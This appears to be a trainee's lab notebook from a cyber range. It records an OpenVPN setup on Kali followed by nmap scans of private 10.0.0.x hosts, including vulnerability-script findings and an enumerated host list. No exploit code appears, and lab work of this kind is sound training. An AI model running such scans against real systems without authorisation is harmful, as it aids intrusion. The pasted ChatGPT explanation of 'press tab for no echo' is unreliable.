Kevin Hoang

3.11.2024

![](media/redkev-1.png)

Connect VPN using OpenVPN on Ubuntu or Debian Linux
===================================================

  
[https://www.youtube.com/watch?v=mc0nxWNwEDI](https://www.google.com/url?q=https://www.youtube.com/watch?v%3Dmc0nxWNwEDI&sa=D&source=editors&ust=1710581474664560&usg=AOvVaw0_xWZV0jCgkEyGRlylbmUC)

Connect to the OpenVPN Backup which is the

OpenVPN V2  (Your access point)

Public IP: 52.88.212.179

Private IP: 10.0.0.134

Open Kali> [https://52.88.212.179/?src=connect](https://www.google.com/url?q=https://52.88.212.179/?src%3Dconnect&sa=D&source=editors&ust=1710581474665790&usg=AOvVaw1XLrB8gEJPdp4aoYm43lo6) > login > click "Yourself (User-locked Profile)" > Click the .ovpn file from the downloads and verify the directory > Go to terminal > sudo apt-get install openvpn > cd to Downloads, and ls to verify its there> "sudo openvpn --config  client.ovpn" then follow prompt for password > verify ip address matches one above  


![](media/redkev-2.png)

Making sure I have login access to the OpenVPN service

![](media/redkev-3.png)

![](media/redkev-4.png)

Reload and Log back in   
![](media/redkev-5.png)

Click on “Yourself(User-locked profile)

![](media/redkev-6.png)

Go to downloads to see client.ovpn is there.

![](media/redkev-7.png)

![](media/redkev-8.png)

1. Login to openvpn
2. Click the available connection profile to download .opvn file
3. Open the file after its downloaded to verify directory

![](media/redkev-9.png)

4. Go to terminal (ensure openvpn is installed “ sudo apt-get install openvpn”  and CD to it , LS to verify its there

![](media/redkev-10.png)

![](media/redkev-11.png)

5. Connect to the server sudo openvpn --config client.ovpn    then follow the prompt by entering your username and password

![](media/redkev-12.png)

![](media/redkev-13.png)  
6. Verify that it says “Initializiation Sequence Completed” as this means youre connected

in sudo openvpn --config client.ovpn , in kali, what is press tab for no echo?

ChatGPT

In the context of running sudo openvpn --config client.ovpn in Kali Linux, when you see "press tab for no echo," it means that if you type your password after the sudo command and then press the Tab key, the password characters won't be displayed as you type them. This is a security measure to prevent someone from looking over your shoulder and seeing your password.

When you're prompted to enter your password after executing a command with sudo, it's common for the terminal not to show any feedback as you type (i.e., no asterisks or dots representing each character). This is to prevent shoulder surfing attacks where someone could observe the length of your password or the characters you're typing. So, instead of displaying any characters, the terminal remains silent until you press Enter to submit your password.

7. Go to Browser , and go to google , in the searchbar type “ my ip address” and verify it matches the one of the vpn

![](media/redkev-14.png)

![](media/redkev-15.png)

┌──(kali㉿kali)-[~]

└─$ ip a

1: lo: <LOOPBACK,UP,LOWER\_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000

        link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00

        inet 127.0.0.1/8 scope host lo

           valid\_lft forever preferred\_lft forever

        inet6 ::1/128 scope host noprefixroute

           valid\_lft forever preferred\_lft forever

2: eth0: <BROADCAST,MULTICAST,UP,LOWER\_UP> mtu 1500 qdisc fq\_codel state UP group default qlen 1000

        link/ether 08:00:27:21:b1:d0 brd ff:ff:ff:ff:ff:ff

        inet 10.0.2.21/24 brd 10.0.2.255 scope global dynamic noprefixroute eth0

           valid\_lft 487sec preferred\_lft 487sec

        inet6 fe80::f7b8:c1d1:2e42:5ef/64 scope link noprefixroute

           valid\_lft forever preferred\_lft forever

3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER\_UP> mtu 1500 qdisc fq\_codel state UNKNOWN group default qlen 500

        link/none

        inet 172.27.216.48/21 scope global tun0

           valid\_lft forever preferred\_lft forever

        inet6 fe80::1cf1:21a5:da8:43a4/64 scope link stable-privacy proto kernel\_ll

           valid\_lft forever preferred\_lft forever

Based on the output of ip a, you have three interfaces:

        lo (Loopback):

            IP address: 127.0.0.1 (private IP)

            This is a loopback interface, used for local communication within the device itself.

        eth0 (Ethernet):

            IP address: 10.0.2.21 (private IP)

            This is your Ethernet interface, with a private IP address assigned to it.

        tun0:

            IP address: 172.27.216.48 (private IP)

            This is likely your VPN interface (tun0), with a private IP address assigned to it as well.

Now, to determine your public IP address, you would need to use an external service as your public IP is typically assigned by your internet service provider (ISP) and is not shown in the output of ip a.

You can use various websites such as https://www.whatismyip.com/ or simply search "what is my IP" on a search engine like Google to find out your public IP address. Your public IP address is what others on the internet see when you communicate with them. It's the address that identifies your network on the wider internet.

![](media/redkev-16.png)

Optional: Do .gitignore and .env to keep things hidden.

![](media/redkev-17.png)

(kali㉿kali)-[~]

└─$ sudo nmap -sS 10.0.0.176

[sudo] password for kali:

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-12 13:55 EDT

Nmap scan report for 10.0.0.176

Host is up (0.011s latency).

Not shown: 998 filtered tcp ports (no-response)

PORT        STATE SERVICE

22/tcp  open  ssh

443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 4.79 seconds

1. Nmap Scan Report: This section provides a summary of the scan results for the target IP address 10.0.0.176.
2. Host Status: The scan indicates that the host at 10.0.0.176 is up and responsive, with a latency of 0.011 seconds. This means that the target system is reachable and active on the network.
3. Port Scanning Results:
* 22/tcp: This port is open and running the SSH (Secure Shell) service. SSH is commonly used for secure remote access to a system.
* 443/tcp: This port is also open and running the HTTPS (Hypertext Transfer Protocol Secure) service. HTTPS is used for secure web browsing and communication, typically for accessing websites over an encrypted connection.
4. Filtered Ports: The output indicates that 998 TCP ports were filtered, meaning Nmap received no response from those ports during the scan. This could indicate that those ports are protected by a firewall or not reachable for some other reason.

Based on the information provided, you have identified two open ports on the target system (22/tcp and 443/tcp), indicating that SSH and HTTPS services are running on the target system. However, simply identifying open ports does not necessarily mean you have "gotten in." 

![](media/redkev-18.png)

sudo nmap -sS -sV 10.0.0.176 [sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-12 18:04 EDT WARNING: Service 10.0.0.176:443 had already soft-matched rtsp, but now soft-matched sip; ignoring second value Nmap scan report for 10.0.0.176 Host is up (0.011s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) 443/tcp open ssl/rtsp 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port443-TCP:V=7.94SVN%T=SSL%I=7%D=3/12%Time=65F0D171%P=x86\_64-pc-linux- SF:gnu%r(GetRequest,19C,"HTTP/1\.0\x20403\x20Forbidden\r\nDate:\x20Tue,\x2 SF:012\x20Mar\x202024\x2022:04:28\x20GMT\r\nSet-Cookie:\x20openvpn\_sess\_d4 SF:521260376dbbea18eac4af4d7e37fd=8175ea330257e2ff4853e45ea70e385b;\x20Exp SF:ires=Tue,\x2012\x20Mar\x202024\x2022:34:28\x20GMT;\x20Path=/;\x20Secure SF:;\x20HttpOnly\r\nX-Frame-Options:\x20SAMEORIGIN\r\nContent-Type:\x20tex SF:t/html;\x20charset=UTF-8\r\nServer:\x20OpenVPN-AS\r\n\r\n<html><head><t SF:itle>Forbidden</title></head><body><h1>Forbidden</h1>Request\x20was\x20 SF:forbidden\.</body></html>")%r(HTTPOptions,19C,"HTTP/1\.0\x20403\x20Forb SF:idden\r\nDate:\x20Tue,\x2012\x20Mar\x202024\x2022:04:33\x20GMT\r\nSet-C SF:ookie:\x20openvpn\_sess\_d4521260376dbbea18eac4af4d7e37fd=794bb952678147b SF:7c45842e94d8f5cf8;\x20Expires=Tue,\x2012\x20Mar\x202024\x2022:34:33\x20 SF:GMT;\x20Path=/;\x20Secure;\x20HttpOnly\r\nX-Frame-Options:\x20SAMEORIGI SF:N\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\nServer:\x20OpenVPN SF:-AS\r\n\r\n<html><head><title>Forbidden</title></head><body><h1>Forbidd SF:en</h1>Request\x20was\x20forbidden\.</body></html>")%r(FourOhFourReques SF:t,19C,"HTTP/1\.0\x20403\x20Forbidden\r\nDate:\x20Tue,\x2012\x20Mar\x202 SF:024\x2022:04:38\x20GMT\r\nSet-Cookie:\x20openvpn\_sess\_d4521260376dbbea1 SF:8eac4af4d7e37fd=a966f8b0f0fb3c94e60b978a18d91db3;\x20Expires=Tue,\x2012 SF:\x20Mar\x202024\x2022:34:38\x20GMT;\x20Path=/;\x20Secure;\x20HttpOnly\r SF:\nX-Frame-Options:\x20SAMEORIGIN\r\nContent-Type:\x20text/html;\x20char SF:set=UTF-8\r\nServer:\x20OpenVPN-AS\r\n\r\n<html><head><title>Forbidden< SF:/title></head><body><h1>Forbidden</h1>Request\x20was\x20forbidden\.</bo SF:dy></html>")%r(GenericLines,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\ SF:r\n")%r(RTSPRequest,19C,"RTSP/1\.0\x20403\x20Forbidden\r\nDate:\x20Tue, SF:\x2012\x20Mar\x202024\x2022:04:53\x20GMT\r\nSet-Cookie:\x20openvpn\_sess SF:\_d4521260376dbbea18eac4af4d7e37fd=508ceef82b6bec076297418e3f3fe489;\x20 SF:Expires=Tue,\x2012\x20Mar\x202024\x2022:34:53\x20GMT;\x20Path=/;\x20Sec SF:ure;\x20HttpOnly\r\nX-Frame-Options:\x20SAMEORIGIN\r\nContent-Type:\x20 SF:text/html;\x20charset=UTF-8\r\nServer:\x20OpenVPN-AS\r\n\r\n<html><head SF:><title>Forbidden</title></head><body><h1>Forbidden</h1>Request\x20was\ SF:x20forbidden\.</body></html>"); Service Info: OS: Linux; CPE: cpe:/o:linux:linux\_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 55.13 seconds

1. Nmap Scan Report: This section provides a summary of the scan results for the target IP address 10.0.0.176.
2. Host Status: The scan indicates that the host at 10.0.0.176 is up and responsive, with a latency of 0.011 seconds. This means that the target system is reachable and active on the network.
3. Port Scanning Results:
* 22/tcp: This port is open and running the SSH (Secure Shell) service. The version of SSH running on the target system is OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 on Ubuntu Linux.
* 443/tcp: This port is open and running a service identified as ssl/rtsp. Additionally, the service running on this port returned HTTP responses indicating that it's related to an OpenVPN Access Server.
4. Unrecognized Service: Despite the service on port 443/tcp returning data, Nmap was unable to identify it. This could be because the service is not in Nmap's service version database, or it may require further analysis to determine its exact nature.
5. Service Info: This section provides additional information about the target system, indicating that the operating system is Linux.

Based on the information provided, you have identified two open ports on the target system (22/tcp and 443/tcp), which are running SSH and an SSL/RTSP service (possibly related to an OpenVPN Access Server), respectively. However, gaining access to a system typically requires additional steps, such as exploiting vulnerabilities or weaknesses in the services running on those ports.

![](media/redkev-19.png)

┌──(kali㉿kali)-[~]

└─$ sudo nmap -sS -O 10.0.0.176

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-12 20:37 EDT

Nmap scan report for 10.0.0.176

Host is up (0.011s latency).

Not shown: 998 filtered tcp ports (no-response)

PORT        STATE SERVICE

22/tcp  open  ssh

443/tcp open  https

Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port

OS fingerprint not ideal because: Missing a closed TCP port so results incomplete

No OS matches for host

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 9.03 seconds

![](media/redkev-20.png)

![](media/redkev-21.png)

![](media/redkev-22.png)

┌──(kali㉿kali)-[~]

└─$ sudo nmap -sS -A 10.0.0.176

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-12 20:40 EDT

WARNING: Service 10.0.0.176:443 had already soft-matched rtsp, but now soft-matched sip; ignoring second value

Nmap scan report for 10.0.0.176

Host is up (0.010s latency).

Not shown: 998 filtered tcp ports (no-response)

PORT        STATE SERVICE  VERSION

22/tcp  open  ssh          OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey:

|   2048 fd:b9:5d:fd:df:63:a9:ce:58:d1:06:61:d3:e3:2d:c8 (RSA)

|   256 a7:5a:12:f7:a2:47:1e:ab:c0:87:71:38:bf:27:c1:1a (ECDSA)

|\_  256 20:49:be:24:33:34:81:64:23:9e:1d:0a:03:96:12:29 (ED25519)

443/tcp open  ssl/rtsp

| tls-nextprotoneg:

|\_  http/1.1

|\_http-server-header: OpenVPN-AS

|\_ssl-date: TLS randomness does not represent time

| tls-alpn:

|\_  http/1.1

| http-title: Forbidden

|\_Requested resource was https://10.0.0.176/\_\_session\_start\_\_/

| fingerprint-strings:

|   FourOhFourRequest:

|         HTTP/1.0 403 Forbidden

|         Date: Wed, 13 Mar 2024 00:40:55 GMT

|         Set-Cookie: openvpn\_sess\_d4521260376dbbea18eac4af4d7e37fd=13de71204655bbe901272b6db0f191b5; Expires=Wed, 13 Mar 2024 01:10:55 GMT; Path=/; Secure; HttpOnly

|         X-Frame-Options: SAMEORIGIN

|         Content-Type: text/html; charset=UTF-8

|         Server: OpenVPN-AS

|         <html><head><title>Forbidden</title></head><body><h1>Forbidden</h1>Request was forbidden.</body></html>

|   GenericLines:

|         HTTP/1.1 400 Bad Request

|   GetRequest:

|         HTTP/1.0 403 Forbidden

|         Date: Wed, 13 Mar 2024 00:40:45 GMT

|         Set-Cookie: openvpn\_sess\_d4521260376dbbea18eac4af4d7e37fd=49db7df0fa78412069de12f146488c1c; Expires=Wed, 13 Mar 2024 01:10:45 GMT; Path=/; Secure; HttpOnly

|         X-Frame-Options: SAMEORIGIN

|         Content-Type: text/html; charset=UTF-8

|         Server: OpenVPN-AS

|         <html><head><title>Forbidden</title></head><body><h1>Forbidden</h1>Request was forbidden.</body></html>

|   HTTPOptions:

|         HTTP/1.0 403 Forbidden

|         Date: Wed, 13 Mar 2024 00:40:50 GMT

|         Set-Cookie: openvpn\_sess\_d4521260376dbbea18eac4af4d7e37fd=3d8c0e1e35686b11b2d031143c81c9d4; Expires=Wed, 13 Mar 2024 01:10:50 GMT; Path=/; Secure; HttpOnly

|         X-Frame-Options: SAMEORIGIN

|         Content-Type: text/html; charset=UTF-8

|         Server: OpenVPN-AS

|         <html><head><title>Forbidden</title></head><body><h1>Forbidden</h1>Request was forbidden.</body></html>

|   RTSPRequest:

|         RTSP/1.0 403 Forbidden

|         Date: Wed, 13 Mar 2024 00:41:10 GMT

|         Set-Cookie: openvpn\_sess\_d4521260376dbbea18eac4af4d7e37fd=d082588df346cffd51902badd73af256; Expires=Wed, 13 Mar 2024 01:11:10 GMT; Path=/; Secure; HttpOnly

|         X-Frame-Options: SAMEORIGIN

|         Content-Type: text/html; charset=UTF-8

|         Server: OpenVPN-AS

|\_        <html><head><title>Forbidden</title></head><body><h1>Forbidden</h1>Request was forbidden.</body></html>

| ssl-cert: Subject: commonName=54.70.254.128

| Not valid before: 2021-11-17T23:49:18

|\_Not valid after:  2031-11-22T23:49:18

| http-robots.txt: 1 disallowed entry

|\_/

1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :

SF-Port443-TCP:V=7.94SVN%T=SSL%I=7%D=3/12%Time=65F0F612%P=x86\_64-pc-linux-

SF:gnu%r(GetRequest,19C,"HTTP/1\.0\x20403\x20Forbidden\r\nDate:\x20Wed,\x2

SF:013\x20Mar\x202024\x2000:40:45\x20GMT\r\nSet-Cookie:\x20openvpn\_sess\_d4

SF:521260376dbbea18eac4af4d7e37fd=49db7df0fa78412069de12f146488c1c;\x20Exp

SF:ires=Wed,\x2013\x20Mar\x202024\x2001:10:45\x20GMT;\x20Path=/;\x20Secure

SF:;\x20HttpOnly\r\nX-Frame-Options:\x20SAMEORIGIN\r\nContent-Type:\x20tex

SF:t/html;\x20charset=UTF-8\r\nServer:\x20OpenVPN-AS\r\n\r\n<html><head><t

SF:itle>Forbidden</title></head><body><h1>Forbidden</h1>Request\x20was\x20

SF:forbidden\.</body></html>")%r(HTTPOptions,19C,"HTTP/1\.0\x20403\x20Forb

SF:idden\r\nDate:\x20Wed,\x2013\x20Mar\x202024\x2000:40:50\x20GMT\r\nSet-C

SF:ookie:\x20openvpn\_sess\_d4521260376dbbea18eac4af4d7e37fd=3d8c0e1e35686b1

SF:1b2d031143c81c9d4;\x20Expires=Wed,\x2013\x20Mar\x202024\x2001:10:50\x20

SF:GMT;\x20Path=/;\x20Secure;\x20HttpOnly\r\nX-Frame-Options:\x20SAMEORIGI

SF:N\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\nServer:\x20OpenVPN

SF:-AS\r\n\r\n<html><head><title>Forbidden</title></head><body><h1>Forbidd

SF:en</h1>Request\x20was\x20forbidden\.</body></html>")%r(FourOhFourReques

SF:t,19C,"HTTP/1\.0\x20403\x20Forbidden\r\nDate:\x20Wed,\x2013\x20Mar\x202

SF:024\x2000:40:55\x20GMT\r\nSet-Cookie:\x20openvpn\_sess\_d4521260376dbbea1

SF:8eac4af4d7e37fd=13de71204655bbe901272b6db0f191b5;\x20Expires=Wed,\x2013

SF:\x20Mar\x202024\x2001:10:55\x20GMT;\x20Path=/;\x20Secure;\x20HttpOnly\r

SF:\nX-Frame-Options:\x20SAMEORIGIN\r\nContent-Type:\x20text/html;\x20char

SF:set=UTF-8\r\nServer:\x20OpenVPN-AS\r\n\r\n<html><head><title>Forbidden<

SF:/title></head><body><h1>Forbidden</h1>Request\x20was\x20forbidden\.</bo

SF:dy></html>")%r(GenericLines,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\

SF:r\n")%r(RTSPRequest,19C,"RTSP/1\.0\x20403\x20Forbidden\r\nDate:\x20Wed,

SF:\x2013\x20Mar\x202024\x2000:41:10\x20GMT\r\nSet-Cookie:\x20openvpn\_sess

SF:\_d4521260376dbbea18eac4af4d7e37fd=d082588df346cffd51902badd73af256;\x20

SF:Expires=Wed,\x2013\x20Mar\x202024\x2001:11:10\x20GMT;\x20Path=/;\x20Sec

SF:ure;\x20HttpOnly\r\nX-Frame-Options:\x20SAMEORIGIN\r\nContent-Type:\x20

SF:text/html;\x20charset=UTF-8\r\nServer:\x20OpenVPN-AS\r\n\r\n<html><head

SF:><title>Forbidden</title></head><body><h1>Forbidden</h1>Request\x20was\

SF:x20forbidden\.</body></html>");

Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port

OS fingerprint not ideal because: Missing a closed TCP port so results incomplete

No OS matches for host

Network Distance: 2 hops

Service Info: OS: Linux; CPE: cpe:/o:linux:linux\_kernel

TRACEROUTE (using port 22/tcp)

HOP RTT         ADDRESS

1   9.31 ms 172.27.216.1

2   9.96 ms 10.0.0.176

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 83.77 seconds

![](media/redkev-23.png)

┌──(kali㉿kali)-[~]

└─$ sudo nmap --script vuln 10.0.0.176

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-12 20:43 EDT

Nmap scan report for 10.0.0.176

Host is up (0.012s latency).

Not shown: 998 filtered tcp ports (no-response)

PORT        STATE SERVICE

22/tcp  open  ssh

443/tcp open  https

| http-slowloris-check:

|   VULNERABLE:

|   Slowloris DOS attack

|         State: LIKELY VULNERABLE

|         IDs:  CVE:CVE-2007-6750

|           Slowloris tries to keep many connections to the target web server open and hold

|           them open as long as possible.  It accomplishes this by opening connections to

|           the target web server and sending a partial request. By doing so, it starves

|           the http server's resources causing Denial Of Service.

|           

|         Disclosure date: 2009-09-17

|         References:

|           https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750

|\_          http://ha.ckers.org/slowloris/

|\_http-dombased-xss: Couldn't find any DOM based XSS.

|\_http-csrf: Couldn't find any CSRF vulnerabilities.

|\_http-stored-xss: Couldn't find any stored XSS vulnerabilities.

| http-enum:

|\_  /robots.txt: Robots file

Nmap done: 1 IP address (1 host up) scanned in 306.81 seconds

  
  
  


Brute Force Method: 10.0.0.1-10.0.0.5 , 10.0.0.7 -10.0.0

  
'10.0.0.126', '10.0.0.197', '10.0.0.123', '10.0.0.82', '10.0.0.74', '10.0.0.175', '10.0.0.100',                    '10.0.0.101', '10.0.0.102', '10.0.0.103', '10.0.0.6', '10.0.0.176']  
  
  
Nfs file share in .123  
  
![](media/redkev-24.png)

![](media/redkev-25.png)

──(kali㉿kali)-[~]

└─$ sudo nmap -sS -A 10.0.0.74

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-13 13:54 EDT

Nmap scan report for 10.0.0.74

Host is up (0.012s latency).

Not shown: 987 closed tcp ports (reset)

PORT          STATE SERVICE                VERSION

135/tcp   open  msrpc                  Microsoft Windows RPC

139/tcp   open  netbios-ssn            Microsoft Windows netbios-ssn

445/tcp   open  microsoft-ds           Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)  (SMB)

554/tcp   open  rtsp?

2869/tcp  open  http                   Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

3389/tcp  open  ssl/ms-wbt-server?

| rdp-ntlm-info:

|   Target\_Name: RISK-ANALYST1

|   NetBIOS\_Domain\_Name: RISK-ANALYST1

|   NetBIOS\_Computer\_Name: RISK-ANALYST1

|   DNS\_Domain\_Name: RISK-ANALYST1

|   DNS\_Computer\_Name: RISK-ANALYST1

|   Product\_Version: 6.1.7601

|\_  System\_Time: 2024-03-13T17:56:42+00:00

|\_ssl-date: 2024-03-13T17:57:45+00:00; 0s from scanner time.

| ssl-cert: Subject: commonName=RISK-ANALYST1

| Not valid before: 2024-03-06T18:10:19

|\_Not valid after:  2024-09-05T18:10:19

5357/tcp  open  http                   Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

|\_http-server-header: Microsoft-HTTPAPI/2.0

|\_http-title: Service Unavailable

8089/tcp  open  ssl/http               Splunkd httpd

|\_http-title: splunkd

|\_http-server-header: Splunkd

| http-robots.txt: 1 disallowed entry

|\_/

| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser

| Not valid before: 2021-06-09T20:57:41

|\_Not valid after:  2024-06-08T20:57:41

10243/tcp open  http                   Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

|\_http-title: Not Found

|\_http-server-header: Microsoft-HTTPAPI/2.0

49152/tcp open  msrpc                  Microsoft Windows RPC

49153/tcp open  msrpc                  Microsoft Windows RPC

49154/tcp open  msrpc                  Microsoft Windows RPC

49165/tcp open  msrpc                  Microsoft Windows RPC

No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

TCP/IP fingerprint:

OS:SCAN(V=7.94SVN%E=4%D=3/13%OT=135%CT=1%CU=39231%PV=Y%DS=2%DC=T%G=Y%TM=65F

OS:1E920%P=x86\_64-pc-linux-gnu)SEQ(SP=FB%GCD=1%ISR=101%TI=I%TS=7)SEQ(SP=FC%

OS:GCD=1%ISR=102%TI=I%TS=7)SEQ(SP=FC%GCD=2%ISR=102%TI=I%TS=7)OPS(O1=M4ECNW8

OS:ST11%O2=M4ECNW8ST11%O3=M4ECNW8NNT11%O4=M4ECNW8ST11%O5=M4ECNW8ST11%O6=M4E

OS:CST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T

OS:=80%W=2000%O=M4ECNW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T

OS:2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N

OS:)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)

OS:IE(R=N)

Network Distance: 2 hops

Service Info: Host: RISK-ANALYST1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:

|\_nbstat: NetBIOS name: RISK-ANALYST1, NetBIOS user: <unknown>, NetBIOS MAC: 06:64:07:5b:75:69 (unknown)

| smb-security-mode:

|   account\_used: <blank>

|   authentication\_level: user

|   challenge\_response: supported

|\_  message\_signing: disabled (dangerous, but default)

| smb-os-discovery:

|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)

|   OS CPE: cpe:/o:microsoft:windows\_7::sp1:professional

|   Computer name: RISK-ANALYST1

|   NetBIOS computer name: RISK-ANALYST1\x00

|   Workgroup: WORKGROUP\x00

|\_  System time: 2024-03-13T10:56:41-07:00

|\_clock-skew: mean: 1h24m00s, deviation: 3h07m50s, median: 0s

| smb2-time:

|   date: 2024-03-13T17:56:41

|\_  start\_date: 2024-03-13T13:47:50

| smb2-security-mode:

|   2:1:0:

|\_        Message signing enabled but not required

TRACEROUTE (using port 199/tcp)

HOP RTT          ADDRESS

1   11.75 ms 172.27.216.1

2   12.53 ms 10.0.0.74

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 197.89 seconds

\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

sudo nmap --script vuln 10.0.0.74

[sudo] password for kali:

Sorry, try again.

[sudo] password for kali:

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-14 20:21 EDT

Nmap scan report for 10.0.0.74

Host is up (0.025s latency).

Not shown: 987 closed tcp ports (reset)

PORT          STATE SERVICE

135/tcp   open  msrpc

139/tcp   open  netbios-ssn

445/tcp   open  microsoft-ds

554/tcp   open  rtsp

2869/tcp  open  icslap

3389/tcp  open  ms-wbt-server

| ssl-dh-params:

|   VULNERABLE:

|   Diffie-Hellman Key Exchange Insufficient Group Strength

|         State: VULNERABLE

|           Transport Layer Security (TLS) services that use Diffie-Hellman groups

|           of insufficient strength, especially those using one of a few commonly

|           shared groups, may be susceptible to passive eavesdropping attacks.

|         Check results:

|           WEAK DH GROUP 1

|                 Cipher Suite: TLS\_DHE\_RSA\_WITH\_AES\_256\_CBC\_SHA

|                 Modulus Type: Safe prime

|                 Modulus Source: RFC2409/Oakley Group 2

|                 Modulus Length: 1024

|                 Generator Length: 1024

|                 Public Key Length: 1024

|         References:

|\_          https://weakdh.org

5357/tcp  open  wsdapi

8089/tcp  open  unknown

10243/tcp open  unknown

49152/tcp open  unknown

49153/tcp open  unknown

49154/tcp open  unknown

49165/tcp open  unknown

Host script results:

|\_smb-vuln-ms10-061: NT\_STATUS\_ACCESS\_DENIED

|\_samba-vuln-cve-2012-1182: NT\_STATUS\_ACCESS\_DENIED

|\_smb-vuln-ms10-054: false

Nmap done: 1 IP address (1 host up) scanned in 107.40 seconds

                                                                                 

┌──(kali㉿kali)-[~]

└─$

![](media/redkev-26.png)

\_\_\_\_\_\_\_\_\_\_

┌──(kali㉿kali)-[~]

└─$ sudo nmap -sS -A 10.0.0.82

[sudo] password for kali:

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-13 18:44 EDT

Nmap scan report for 10.0.0.82

Host is up (0.013s latency).

Not shown: 989 closed tcp ports (reset)

PORT          STATE        SERVICE            VERSION

21/tcp        open         ftp                Microsoft ftpd

| ftp-syst:

|\_  SYST: Windows\_NT

80/tcp        open         http               Microsoft IIS httpd 7.5

|\_http-title: Site doesn't have a title (text/html).

|\_http-server-header: Microsoft-IIS/7.5

| http-methods:

|\_  Potentially risky methods: TRACE

135/tcp   filtered msrpc

139/tcp   filtered netbios-ssn

445/tcp   filtered microsoft-ds

3389/tcp  open         ms-wbt-server?

|\_ssl-date: 2024-03-13T22:46:14+00:00; -5s from scanner time.

| rdp-ntlm-info:

|   Target\_Name: VAGRANT-2008R2

|   NetBIOS\_Domain\_Name: VAGRANT-2008R2

|   NetBIOS\_Computer\_Name: VAGRANT-2008R2

|   DNS\_Domain\_Name: vagrant-2008R2

|   DNS\_Computer\_Name: vagrant-2008R2

|   Product\_Version: 6.1.7601

|\_  System\_Time: 2024-03-13T22:46:13+00:00

| ssl-cert: Subject: commonName=vagrant-2008R2

| Not valid before: 2024-03-06T18:10:04

|\_Not valid after:  2024-09-05T18:10:04

49152/tcp open         msrpc              Microsoft Windows RPC

49153/tcp open         msrpc              Microsoft Windows RPC

49154/tcp open         msrpc              Microsoft Windows RPC

49157/tcp open         msrpc              Microsoft Windows RPC

49158/tcp open         msrpc              Microsoft Windows RPC

No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

TCP/IP fingerprint:

OS:SCAN(V=7.94SVN%E=4%D=3/13%OT=21%CT=1%CU=35455%PV=Y%DS=2%DC=T%G=Y%TM=6

OS:2CBB%P=x86\_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=109%TI=I%TS=7)SEQ(SP=

OS:%GCD=1%ISR=109%TI=I%TS=7)SEQ(SP=104%GCD=1%ISR=10A%TI=I%TS=7)OPS(O1=M4

OS:W8ST11%O2=M4ECNW8ST11%O3=M4ECNW8NNT11%O4=M4ECNW8ST11%O5=M4ECNW8ST11%O

OS:4ECST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%D

OS:%T=80%W=2000%O=M4ECNW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0

OS:)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T

OS:=N)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%R

OS:G)IE(R=N)

Network Distance: 2 hops

Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:

|\_clock-skew: mean: -5s, deviation: 0s, median: -5s

TRACEROUTE (using port 995/tcp)

HOP RTT          ADDRESS

1   12.12 ms 172.27.216.1

2   12.41 ms 10.0.0.82

OS and Service detection performed. Please report any incorrect results tps://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 99.42 seconds

\_\_\_\_\_\_\_\_\_\_

